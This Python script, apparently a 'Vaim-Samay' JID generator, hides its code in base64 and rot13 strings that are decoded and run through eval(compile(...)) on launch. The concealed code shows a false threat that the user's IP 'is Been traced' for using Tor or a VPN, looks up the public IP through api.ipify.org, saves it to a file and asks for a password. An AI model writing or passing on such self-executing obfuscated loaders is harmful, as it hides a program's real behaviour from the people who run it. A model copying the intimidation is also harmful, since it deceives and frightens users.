# Python code obfuscated by www.development-tools.net 
 

import base64, codecs
magic = 'Iy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgU2NyaXB0ZWQgYnkgc2FtYXkgCiMgZGVzaWduIGNyZWRpdHMgOiBWYWltcGllciByaXRpayAKIyBQeXRob24zIGRhdGFiYXNlIGV4cGVydCAKIyBWYWltIC0gU2FtYXkgUHJvamVjdHMgCiMgQ29weSBUaGlzIHNjcmlwdCBkb2Vzbid0ICBtYWtlcyB5b3UgY29kZXIgCiMgVmFpbS1TYW1heSBKaWQgR2VuZXJhdG9yIAojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1JbXBvcnRzCgpmcm9tIG9zIGltcG9ydCBzeXN0ZW0KZnJvbSB0aW1lIGltcG9ydCBzbGVlcCAKaW1wb3J0IG9zCmltcG9ydCBzeXMKaW1wb3J0IHJhbmRvbQpmcm9tIHJlcXVlc3RzIGltcG9ydCBnZXQKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tQ29sb3JzCgpyID0gIlwwMzNbMTszMW0iCmcgPSAiXDAzM1sxOzMybSIKeSA9ICJcMDMzWzE7MzNtIgpiID0gIlwwMzNbMTszNG0iCmQgPSAiXDAzM1syOzM3bSIKUiA9ICJcMDMzWzE7NDFtIgpZID0gIlwwMzNbMTs0M20iCkIgPSAiXDAzM1sxOzQ0bSIKdyA9ICJcMDMzWzE7MzdtIgoKCgoKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tYmFubmVycyAKCmxvZ28gPSAiIiJcMDMzWzE7MzdtCgpcMDMzWzE7MzdtWyFdIFwwMzNbMTszMW1UaGlzIGlzIHVzZSBmb3IgSklEcyBnZW5lcmF0b3IsIFlvdSBjYW4gVW5saW1pdGVkbHkgRWRpdCAhISEgQllFIDpfKQpcMDMzWzE7MzdtCuKUjC09PT09PT09PT09PT09PT09PT09PT09PT09PT09PSAgIC0gICAKPSAgICAgIFwwMzNbMTszMW0gLiDilIzilIDilIDilIDilIDilIDilIDilIDilIAgXDAzM1sxOzM3bVZhaW0tU2FtYXktVklSVVNNQU4gICAgLSAgIAo9ICBcMDMzWzE7MzFtIC7ilIzilI'
love = 'QvyVQvyVNtVSjjZmAoZGfmA21PYHuuqPOGLJ1urFNtVPNtVPNtVPNtVP0tVPOpZQZmJmZ0oIivaWEqVPNtVPObqUEjpmbiY2qcqTu1Lv5wo20ip2SgLKx4ZwHtVPNtVPNtVSivaWEqPyjjZmAoZGfmA209VPNtVRcWEPOUMJ5ypzS0o3VtYFODpz8tVPNtVPNtVPNtYFNtVSjjZmAoZmEgJ+XpyS0tVPNtVPNtVPNtVPOJMKWmnJ9hVQVhZPNtVPNtVPNtVPNtVPNtVPNtJ+XpyS0XKQNmZ1fkBmZ3oG0tKQNmZ1fkBmZkoFNhVBXHyBXHtBXHtBXHtBXHtPOpZQZmJmR7ZmqgDyxtH2SgLKxtVPNtVPNtVPNtVPNtVPNgVPNtKQNmZ1f5ZJ1oJS0tHTkyLKAyVREiovq0VSImMFOTo3VtnJkfMJquoPOOL3Ecqzy0rFNtJ1uqPyjjZmAoZGfmA209VSjjZmAoZGfmZJ0tYvNtVPNt4cFH4cFN4cFN4cFNVSjjZmAoZGfmA21JEIWGFH9BVQVhZPNtVPNtVPNtVP0XKQNmZ1fkBmZ3orXHyP09CG09CG09CG09CG09CG09CG09CG09CG09CG09CFNtVP0XPyjjZmAoZGfmZJ0tVPNtPxEcp2AfLJygMKV6VSjjZmAoZGfmZz10nTymVUEio2jtnKZtMTImnJqhMJDtMz9lVSOlLJ5ePtxtVPNtqTImqTyhMlOcovOuovOuqKEbo3WcrzIxVUAcoKIfLKEyMPOwrJWypzS0qTSwnjbWVPNtVRS0qTSwn2yhMlO0LKWaMKEmVUqcqTuiqKDtpUWco3VtoKI0qJSfVTAioaAyoaDXVPNtVPNtVPNtVPNtnKZtnJkfMJquoPRtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNXKQNmZ1fkBmZ3oFNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVPNtVNcpZQZmJmx3oFNvVvVXPzEyMvOvLJ5hMKVbXGbXVPNtVUOlnJ50XTkiM28cPtcxMJLtp3OuL2IsoTyhMFtcBtbtVPNtpUWcoaDbW1khWlxXVl0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYF0gYJ9vnzIwqPOipzyyoaEyMPOjpz9apzSgoJyhMlNXPzAfLKAm'
god = 'IEJhbm5lcjoKICAgIF9fbWFpbl9fID0gJ19mdWNrX18nCiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpCiAgICAgICAgc3BhY2VfbGluZSgpCiAgICAgICAgcHJpbnQocisi4pSU4pSAIit3KyJcMDMzWzE7MzdtRG9uJ3QgYmUgc21hcnQgVG8gdXNlIHRvciBvciBWcG4gWW91ciBpcCBpcyBCZWVuIHRyYWNlZCBQbGVhc2UgV2FpdC4uLi4uICAiKQogICAgICAgIHNwYWNlX2xpbmUoKQogICAgICAgIHRyeToKICAgICAgICAgICBpcCA9IGdldCgnaHR0cHM6Ly9hcGkuaXBpZnkub3JnJykudGV4dAogICAgICAgICAgIHByaW50KHIrIuKUlOKUgCIrdysiXDAzM1sxOzM3bVlvdXIgUHVibGljIElwIEFkZHJlc3MgOiAiK3IrInswfSIuZm9ybWF0KGlwKSkKICAgICAgICAgICB3aXRoIG9wZW4oJ2lwLnR4dCcsJ3cnKSBhcyBzYW1heToKICAgICAgICAgICAgICAgc2FtYXkud3JpdGUoZ2V0KCdodHRwczovL2FwaS5pcGlmeS5vcmcnKS50ZXh0KQogICAgICAgICAgIHNsZWVwKDAuNSkKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIHNwb29mX2lwOgogICAgICAgICAgICBzcGFjZV9saW5lKCkKICAgICAgICAgICAgcHJpbnQocisi4pSU4pSAIit3KyJcMDMzWzE7MzdtUGxlYXNlIENoZWNrIFlvdXIgSW50ZXJuZXQgQ29ubmVjdGlvbiAhICIpCiAgICAgICAgICAgIHNwYWNlX2xpbmUoKQogICAgICAgICAgICBwcmludChyKyLilJTilIAiK3crIlwwMzNbMTszN21SZXN0YXJ0IHRoZSBQcm9ncmFtICEiKQogICAgICAgICAgICBzcGFjZV9saW5lKCkKICAgICAgICAgICAgc2xlZXAoMy4wKQogICAgICAgICAgICBzeXMuZXhpdCgpICAgCiAgICBkZWYgcGFzc3dvcmQoc2VsZik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICAgICAgcHJpbnQoJ1'
destiny = 'khWlxXVPNtVPNtVPNtVPNtVPNtVUA5p3EyoFtaL2kyLKVaXDbtVPNtVPNtVPNtVPNtVPNtLzShozIlXPxXVPNtVPNtVPNtVPNtVPNtVUOup3A3o3WxK3HtCFOcoaO1qPulXlYvyWGvyVNvX3peVyjjZmAoZGfmA21SoaEypvO0nTHtHTSmp3qipzDtBvNvX3VcPvNtVPNtVPNtVPNtVPNtVPOmMJkzYaOup3A3o3WxK3HtCFOjLKAmq29lMS91PvNtVPNtVPNtVPNtVPNtVPOcMvOmMJkzYaOup3A3o3WxK3H9CKAyoTLhpTSmp3qipzEsL29hMwbXVPNtVPNtVPNtVPNtVPNtVPNtVPOmpTSwMI9fnJ5yXPxXVPNtVPNtVPNtVPNtVPNtVPNtVPOjpzyhqPulXlYvyWGvyVNvX3peVyjjZmAoZGfmA21DLKAmq29lMPOcplOwo3WlMJA0VPRtVPVcPvNtVPNtVPNtVPNtVPNtVPNtVPNtp2kyMKNbZv4jXDbtVPNtVPNtVPNtVPNtVPNtVPNtVUA5p3EyoFtaL2kyLKVaXDbtVPNtVPNtVPNtVPNtVPNtVPNtVTWlMJSePvNtVPNtVPNtVPNtVPNtVPOyoUAyBtbtVPNtVPNtVPNtVPNtVPNtVPNtVUAjLJAyK2kcozHbXDbtVPNtVPNtVPNtVPNtVPNtVPNtVUOlnJ50XUVeVhXHyBXHtPVeqlfvKQNmZ1fkBmZ3oIOup3A3o3WxVTymVTyhL29lpzIwqPNuVPVcPvNtVPNtVPNtVPNtVPNtVPNtVPNtp3OuL2IsoTyhMFtcPvNtVPNtVPNtVPNtVPNtVPNtVPNtp2kyMKNbZP45XDbtVPNtVPNtVPNtVPNtVPNtVPNtVUA5p3EyoFtapUy0nT9hZlOmMKE0nJ5apl5dp29hYaO5WlxXVPNtVPNtVPNtVPNtVPNtVPNtVPOvpzIunjbXPtbtVPNtVPNtVTI4L2IjqPOSrTAypUEco24tLKZtMGbXVPNtVPNtVPNtVPNtp3OuL2IsoTyhMFtcPvNtVPNtVPNtVPNtVUOlnJ50XPWjpz9apzSgVT1cp3Eun2HtnKZtBvNvX3A0pvuyXFxXVPNtVPNtVPNXp2SgLKxtCFOPLJ5hMKVbXDcmLJ1urF5jLKAmq29lMS9wo25zVQ0tXPqmLJ1urI9wrJWinlpcPaAuoJS5YaOup3A3o3WxXPxXPt=='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))